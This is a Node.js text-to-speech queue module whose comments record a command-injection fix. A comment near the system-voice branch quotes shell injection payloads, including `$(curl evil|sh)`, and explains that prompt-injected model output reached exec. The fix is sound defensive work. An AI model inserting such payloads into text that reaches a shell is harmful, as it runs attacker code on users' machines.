import { spawn } from 'child_process';
import { promises as fs } from 'fs';
import os from 'os';
import path from 'path';
import { TTSConfig as gptTTSConfig } from '../models/gpt.js';
import { TTSConfig as geminiTTSConfig } from '../models/gemini.js';

let speakingQueue = []; // each item: {text, model, audioData, ready}
let isSpeaking = false;

/**
 * 队列泵的**唯一**入口。
 *
 * `processQueue()` 是自递归的（播完一句再调自己播下一句），而顶层的 `speak()` 是
 * **同步**函数 —— 所以这条链天生是 fire-and-forget，没法简单"改成 await"。
 *
 * ★ T32：因此必须**显式接住 rejection**：
 *   · 一次 unhandled rejection 会把整个 agent 进程带走；
 *   · 就算只失败这一句，漏了 catch 也会让 `isSpeaking` 永远卡在 true，
 *     **之后整个 TTS 队列永久静音**（日志里只有一条 unhandled rejection，最难查）。
 */
function continueQueue() {
    processQueue().catch((e) => {
        console.error('[TTS] 队列异常（已隔离，不中断播放）：', e);
        // ★ R4 §7-④（2026-11-07 第四轮审计）：**这里原来是唯一漏掉复位的地方**。
        //   缺陷原貌：`catch` 只 `console.error` 一行，没有把 `isSpeaking` 放回 false。
        //   而 `isSpeaking` 是"泵在跑吗"的闸门：`speak()` 里 `if (!isSpeaking) continueQueue()`
        //   ⇒ 只要有一次异常走到这里（例如 `item.text` 不是字符串，`txt.trim()` 直接 TypeError），
        //   闸门**永久卡在 true**，之后所有 TTS 请求只会入队、永远没人播 —— 症状是"她突然永久哑了"，
        //   日志里只有一条不显眼的 unhandled rejection。
        //   修法：复位闸门 + 把泵重新拉起来（空队列时 processQueue 自己会立刻返回）。
        isSpeaking = false;
        pumpNext();
    });
}

/**
 * 在一次异常之后把泵**重新拉起**。
 *
 * 走 `queueMicrotask`/promise 而不是直接递归：如果失败是**同步**抛出的，
 * 直接 `continueQueue()` 会在同一个微任务栈上层层嵌套；走下一个微任务就没有这个风险。
 * `speakingQueue.length` 兜底：队空了就不必再起泵（processQueue 本来也只做复位）。
 */
function pumpNext() {
    Promise.resolve().then(() => {
        if (!isSpeaking && speakingQueue.length > 0) continueQueue();
    });
}

export function speak(text, speak_model) {
    const model = speak_model || 'system';

    const item = { text, model, audioData: null, ready: null };

    if (model === 'system') {
        // no preprocessing needed
        item.ready = Promise.resolve();
    } else {
    item.ready = fetchRemoteAudio(text, model)
        .then(data => { item.audioData = data; })
        .catch(err => { item.error = err; });
    }

    speakingQueue.push(item);
    if (!isSpeaking) continueQueue();
}

async function fetchRemoteAudio(txt, model) {
    function getModelUrl(prov) {
        if (prov === 'openai') return gptTTSConfig.baseUrl;
        if (prov === 'google') return geminiTTSConfig.baseUrl;
        return 'https://api.openai.com/v1';
    }

    let prov, mdl, voice, url;
    if (typeof model === 'string') {
        [prov, mdl, voice] = model.split('/');
        url = getModelUrl(prov);
    } else {
        prov = model.api;
        mdl = model.model;
        voice = model.voice;
        url = model.url || getModelUrl(prov);
    }

    if (prov === 'openai') {
        return gptTTSConfig.sendAudioRequest(txt, mdl, voice, url);
    } else if (prov === 'google') {
        return geminiTTSConfig.sendAudioRequest(txt, mdl, voice, url);
    }
    else {
        throw new Error(`TTS Provider ${prov} is not supported.`);
    }
}

async function processQueue() {
    isSpeaking = true;
    if (speakingQueue.length === 0) {
        isSpeaking = false;
        return;
    }
    const item = speakingQueue.shift();
    // ★ R4 §7-④：`text` 不是字符串时 `txt.trim()` 会直接 TypeError，把泵卡死在
    //   `isSpeaking = true`（见 continueQueue 的说明）。入口统一收成字符串。
    const model = item.model;
    const txt = typeof item.text === 'string' ? item.text : String(item.text ?? '');
    if (txt.trim() === '') {
        isSpeaking = false;
        continueQueue();
        return;
    }

    const isWin = process.platform === 'win32';
    const isMac = process.platform === 'darwin';

    // wait for preprocessing if needed
    try {
        await item.ready;
        if (item.error) throw item.error;
    } catch (err) {
        console.error('[TTS] preprocess error', err);
        isSpeaking = false;
        continueQueue();
        return;
    }

    if (model === 'system') {
        // ★ F-EXEC-201（2026-11-06）：**绝不再把文本拼进命令行**。
        // 原来这里是 `exec(cmd)`，cmd 由 txt 拼成（win 只转义单引号、mac/linux 只转义双引号），
        // 于是模型输出（可被提示注入）里的 `hi"; & echo PWNED & rem "` 或 `$(curl evil|sh)`
        // 会变成真正的命令。**转义黑名单永远漏**，所以改结构：argv 全是字面量，文本走 stdin。
        //
        // ⚠️ 两条复核席实测结论，别"顺手加固"错了方向（2026-11-06）：
        //   ① **不要**在这里加 `[Console]::InputEncoding = [Text.Encoding]::UTF8`。
        //      实测 Windows 下默认编码**本来就是对的**；加了那行**反而把中文念成乱码**。
        //      （改之前先在真机试一遍中文，别凭直觉。）
        //   ② `inspectChatText` **不是 shell 过滤器** —— 它只拦"以 / 开头的行"，
        //      对 `"` `$()` `&` `|` 完全不拦。将来任何"文本 → 外部进程"的实现都**不得依赖它**，
        //      必须像这里一样：参数走 argv 字面量、数据走 stdin。
        const file = isWin ? 'powershell' : isMac ? 'say' : 'espeak';
        const argv = isWin
            ? ['-NoProfile', '-NonInteractive', '-Command',
                'Add-Type -AssemblyName System.Speech; ' +
                '$s = New-Object System.Speech.Synthesis.SpeechSynthesizer; ' +
                '$s.Rate = 2; ' +
                '$t = [Console]::In.ReadToEnd(); ' +   // 文本只从 stdin 进，绝不进命令行
                '$s.Speak($t); $s.Dispose()']
            : isMac
            ? []                                     // `say` 无参数 = 从 stdin 读
            : ['--stdin'];                           // espeak 显式从 stdin 读

        let finished = false;
        const done = () => {
            if (finished) return;                    // error 与 close 可能都触发，只推进一次
            finished = true;
            isSpeaking = false;
            continueQueue();
        };

        let child;
        try {
            child = spawn(file, argv, { stdio: ['pipe', 'ignore', 'ignore'], windowsHide: true });
        } catch (e) {
            console.error('TTS spawn failed', e);
            done();
            return;
        }
        child.on('error', (err) => { console.error('TTS error', err); done(); });
        child.on('close', () => done());
        if (child.stdin) {
            child.stdin.on('error', () => { /* EPIPE：子进程已退出，close 会推进队列 */ });
            child.stdin.end(String(txt));
        }

    } 
    else {
        // audioData was already fetched in speak()
        const audioData = item.audioData;

        if (!audioData) {
            console.error('[TTS] No audio data ready');
            isSpeaking = false;
            continueQueue();
            return;
        }

        try {
            if (isWin) {
                const tmpPath = path.join(os.tmpdir(), `tts_${Date.now()}.mp3`);
                await fs.writeFile(tmpPath, Buffer.from(audioData, 'base64'));

                const player = spawn('ffplay', ['-nodisp', '-autoexit', '-loglevel', 'quiet', tmpPath], {
                    stdio: 'ignore', windowsHide: true
                });
                player.on('error', async (err) => {
                    console.error('[TTS] ffplay error', err);
                    try { await fs.unlink(tmpPath); } catch {}
                    isSpeaking = false;
                    // ★ T32：这两个回调本来就是 async 的 → 直接 await 最直白
                    await processQueue();
                });
                player.on('exit', async () => {
                    try { await fs.unlink(tmpPath); } catch {}
                    isSpeaking = false;
                    await processQueue();
                });

            } else {
                const player = spawn('ffplay', ['-nodisp','-autoexit','pipe:0'], {
                    stdio: ['pipe','ignore','ignore']
                });
                player.stdin.write(Buffer.from(audioData, 'base64'));
                player.stdin.end();
                player.on('exit', () => {
                    isSpeaking = false;
                    continueQueue();
                });
            }
        } catch (e) {
            console.error('[TTS] Audio error', e);
            isSpeaking = false;
            continueQueue();
        }
    }
}

/**
 * ★ R4 §7-④：**只给离线单测用的观察窗**（生产代码不读它）。
 *
 * 为什么需要：要断言"一次异常之后队列泵还在跑"，从外部只能靠副作用
 * （真的去 spawn powershell / ffplay，单测里不能这么干）。给出两个只读探针，
 * 让 tools/*_unit.mjs 能直接验行为，而不是去 grep 源码字符串（那不是测试）。
 */
export const __ttsDiagnostics = {
    /** 还有几句在排队 */
    pending: () => speakingQueue.length,
    /** 泵是否卡在"正在播"（一次异常后必须回到 false） */
    isSpeaking: () => isSpeaking,
};
